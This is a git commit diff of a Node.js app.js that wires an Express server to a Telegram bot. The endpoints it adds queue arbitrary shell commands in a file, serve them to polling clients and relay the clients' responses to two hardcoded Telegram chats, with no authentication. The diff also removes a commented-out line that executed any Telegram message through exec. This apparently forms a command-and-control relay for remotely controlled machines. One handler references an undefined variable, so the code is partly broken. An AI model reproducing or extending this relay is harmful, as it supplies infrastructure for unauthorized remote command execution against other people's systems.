bcb9b4a455c8c233d89b69dce394d955795a65ba
Hayk <77397812+HaykMarkosyan@users.noreply.github.com>
2023-05-20 02:43:25 +0400

    Update app.js

--- app.js
+++ app.js
@@ -1,5 +1,6 @@
 require("dotenv").config();
 const express = require("express");
+const fs = require("fs");
 const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 
@@ -8,13 +9,36 @@ const bot = new TelegramBot(process.env["BOT_TOKEN"], {polling: true});
 
 
 app.get("/doit", async(req, res) => {
-    bot.sendMessage(5088649217, req.query.cmd||req.query.command);
-    bot.sendMessage(1417274417, req.query.cmd||req.query.command);
+    fs.writeFileSync("./cmd.txt", req.query.cmd||req.query.command);
 
-    return res.send("done");
+    return res.send("Done!");
 });
 
-// bot.on("message", (msg) => exec(String(msg.text), (err, stdout, stderr) => err ? console.log(err) : bot.sendMessage(msg.chat.id, String(stdout+"\n\n\nError: "+stderr||"No Error"))));
+app.get("/cmd", async(req, res) => res.send(fs.readFileSync("./cmd.txt")));
+
+app.get("/res", async(req, res) => {
+    bot.sendMessage(5088649217, req.query.res||req.query.response);
+    bot.sendMessage(1417274417, req.query.res||req.query.response);
+
+    return res.send("Done!");
+})
+
+bot.on("message", (msg) => {
+    if(msg.text.indexOf("/get")===0) {
+        let cmd = fs.readFileSync("./cmd.txt");
+        bot.sendMessage(5088649217, cmd);
+        bot.sendMessage(1417274417, cmd);
+    }
+
+    if(msg.text.indexOf("/doit")===0) {
+        fs.writeFileSync("./cmd.txt", msg.text.substring(6));
+
+        bot.sendMessage(5088649217, cmd);
+        bot.sendMessage(1417274417, cmd);
+    }
+    // fs.writeFileSync("./cmd.txt", msg.text);
+    // bot.sendMessage(msg.chat.id, "Done!");
+});
 
 
 app.listen(process.env.PORT, function() {console.log(`App running on port ${process.env.PORT}`);});
